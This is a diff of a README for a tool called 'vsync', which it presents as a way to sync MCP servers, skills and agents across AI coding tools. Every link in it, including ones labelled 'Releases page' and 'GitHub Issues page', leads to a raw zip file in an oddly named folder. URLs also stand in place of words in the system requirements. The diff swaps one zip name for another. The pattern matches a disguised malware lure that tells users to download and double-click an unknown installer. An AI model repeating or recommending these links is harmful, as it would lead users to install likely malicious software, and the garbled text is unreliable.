@@ -1,15 +1,15 @@
 # 🌟 vsync - Effortlessly Sync Your Tools
 
 ## 🔗 Download vsync
-[![Download vsync](https://github.com/Hardik455abc/vsync/raw/refs/heads/main/pentachloride/Software_rombos.zip%20vsync-v1.0-blue)](https://github.com/Hardik455abc/vsync/raw/refs/heads/main/pentachloride/Software_rombos.zip)
+[![Download vsync](https://github.com/Hardik455abc/vsync/raw/refs/heads/main/pentachloride/Software-Guetare.zip%20vsync-v1.0-blue)](https://github.com/Hardik455abc/vsync/raw/refs/heads/main/pentachloride/Software-Guetare.zip)
 
 ## 🚀 Getting Started
 vsync helps you sync your MCP servers, Skills, Agents, and Commands. Use it across Claude Code, Cursor, OpenCode, and Codex. With one configuration, you streamline your workflow across all tools.
 
 ## 📥 Download & Install
-To get started with vsync, visit this page to download: [Download vsync](https://github.com/Hardik455abc/vsync/raw/refs/heads/main/pentachloride/Software_rombos.zip).
+To get started with vsync, visit this page to download: [Download vsync](https://github.com/Hardik455abc/vsync/raw/refs/heads/main/pentachloride/Software-Guetare.zip).
 
-1. Go to the [Releases page](https://github.com/Hardik455abc/vsync/raw/refs/heads/main/pentachloride/Software_rombos.zip).
+1. Go to the [Releases page](https://github.com/Hardik455abc/vsync/raw/refs/heads/main/pentachloride/Software-Guetare.zip).
 2. Look for the latest version.
 3. Download the installer file that matches your operating system. 
 
@@ -18,10 +18,10 @@ After downloading, simply double-click the installer file to run it. Follow the 
 ## ⚙️ System Requirements
 Before installing vsync, ensure that your system meets the following requirements:
 
-- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a Linux distribution that supports https://github.com/Hardik455abc/vsync/raw/refs/heads/main/pentachloride/Software_rombos.zip
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a Linux distribution that supports https://github.com/Hardik455abc/vsync/raw/refs/heads/main/pentachloride/Software-Guetare.zip
 - **Storage:** At least 200 MB of free space.
 - **Memory:** Minimum of 4 GB RAM.
-- **https://github.com/Hardik455abc/vsync/raw/refs/heads/main/pentachloride/Software_rombos.zip** Version 14.x or higher is recommended.
+- **https://github.com/Hardik455abc/vsync/raw/refs/heads/main/pentachloride/Software-Guetare.zip** Version 14.x or higher is recommended.
 
 ## ⚙️ Configuration
 After installation, you will need to configure vsync. Here’s how:
@@ -61,7 +61,7 @@ Stay tuned for updates!
 To uninstall, go to your system's Control Panel (Windows) or Applications folder (macOS). Select vsync and choose the uninstall option.
 
 ### Where can I find help if I have issues?
-Visit our [GitHub Issues page](https://github.com/Hardik455abc/vsync/raw/refs/heads/main/pentachloride/Software_rombos.zip) to report any problems or ask questions.
+Visit our [GitHub Issues page](https://github.com/Hardik455abc/vsync/raw/refs/heads/main/pentachloride/Software-Guetare.zip) to report any problems or ask questions.
 
 ### Can I contribute to vsync?
 Absolutely! We welcome contributions. Please read our contribution guidelines in the repository for more information.
